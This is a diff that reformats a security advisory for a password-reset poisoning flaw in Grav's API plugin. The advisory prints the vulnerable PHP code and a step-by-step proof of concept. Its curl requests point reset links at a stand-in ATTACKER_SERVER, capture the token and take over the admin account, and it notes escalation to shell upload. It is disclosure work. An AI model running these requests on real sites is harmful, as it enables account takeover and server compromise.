@@ -15,13 +15,13 @@ An unsafe URL resolution in the password reset flow allows any unauthenticated a
 The `POST /api/v1/auth/forgot-password` endpoint accepts an `admin_base_url` field from the request body. This client-supplied URL is used  to construct the password reset link that is then emailed to the victim.
 
 **Source: `user/plugins/api/classes/Api/Controllers/AuthController.php:311`**
-```php
+```
 // Line 311 - client-controlled URL passed directly into email construction
 $this->sendAdminNextResetEmail($user, $token, $body['admin_base_url'] ?? null, $request);
 ```
 
 **Source: `user/plugins/api/classes/Api/Controllers/AuthController.php:336`**
-```php
+```
 private function sendAdminNextResetEmail(
     UserInterface $user,
     string $token,
@@ -35,10 +35,11 @@ private function sendAdminNextResetEmail(
         . '/reset?user=' . rawurlencode((string) $user->username)
         . '&token=' . rawurlencode($token);
     // ...email sent with this link to the victim
+}
 ```
 
 **Source: `user/plugins/api/classes/Api/Controllers/ResolvesAdminBaseUrl.php:31-77`**
-```php
+```
 protected function resolveAdminBaseUrl(
     mixed $clientBaseUrl,
     ServerRequestInterface $request,
@@ -98,23 +99,23 @@ The same `ResolvesAdminBaseUrl` trait and `admin_base_url` field is used in `Inv
 **Prerequisites**: A running Grav instance with the API plugin enabled. Only the victim's email address must be known.
 
 **Step 1 — Set up attacker infrastructure**
-```bash
+```
 # Simple HTTP server to capture incoming requests
 python3 -m http.server 80
 ```
 
 **Step 2 - Trigger poisoned password reset (vector 1: request body)**
-```bash
-curl -s -X POST https://127.0.0.1:8000/api/v1/auth/forgot-password \
-  -H "Content-Type: application/json" \
-  -d '{
-    "email": "admin@target.com",
-    "admin_base_url": "http://ATTACKER_SERVER"
-  }'
+```
+└─$ curl -s -X POST https://127.0.0.1:8000/api/v1/auth/forgot-password \
+      -H "Content-Type: application/json" \
+      -d '{
+        "email": "admin@target.com",
+        "admin_base_url": "http://ATTACKER_SERVER"
+      }'
 ```
 
 Expected response (neutral, non-leaking):
-```json
+```
 {"data":{"message":"If an account exists for that email, a reset link has been sent."}} 
 ```
 
@@ -129,14 +130,14 @@ When the victim clicks the link, the `token` query parameter arrives at the atta
 
 **Step 4 — Complete the account takeover**
 
-```bash
-curl -s -X POST http://127.0.0.1:8000/api/v1/auth/reset-password \
-  -H "Content-Type: application/json" \
-  -d '{
-    "username": "admin",
-    "token": "a3f2c1d...",
-    "password": "NewPassword123!"
-  }'
+```
+└─$ curl -s -X POST http://127.0.0.1:8000/api/v1/auth/reset-password \
+     -H "Content-Type: application/json" \
+     -d '{
+       "username": "admin",
+       "token": "a3f2c1d...",
+       "password": "NewPassword123!"
+     }'
 ```
 
 Expected response:
@@ -148,11 +149,11 @@ The attacker now owns the victim/admin account.
 
 **Step 5 - Alternative: Referer-header vector (no body field needed)**
 
-```bash
-curl  -X POST https://127.0.0.1:8000/v1/auth/forgot-password \
-  -H "Content-Type: application/json" \
-  -H "Referer: http://ATTACKER_SERVER/forgot" \
-  -d '{"email": "admin@target.com"}'
+```
+└─$ curl  -X POST https://127.0.0.1:8000/v1/auth/forgot-password \
+      -H "Content-Type: application/json" \
+      -H "Referer: http://ATTACKER_SERVER/forgot" \
+      -d '{"email": "admin@target.com"}'
 ```
 
 The `/forgot` suffix is automatically stripped by `resolveAdminBaseUrl()`, and `http://ATTACKER_SERVER` is used as the reset link base.
@@ -166,4 +167,4 @@ The `/forgot` suffix is automatically stripped by `resolveAdminBaseUrl()`, and `
 - Full account takeover of any user account, including superadmin
 - Attacker gains complete control over the Grav admin panel
 - From admin access: arbitrary page content editing, plugin/theme installation, and file management - all of which can lead to remote code execution on the underlying server (e.g., uploading a PHP shell via the admin panel on misconfigured setups, or enabling Twig-in-content with sandbox disabled)
-- The attack is silent: the victim receives a legitimate-looking reset email and may not notice the link destination is an external host
+- The attack is silent: the victim receives a legitimate-looking reset email and may not notice the link destination is an external host.
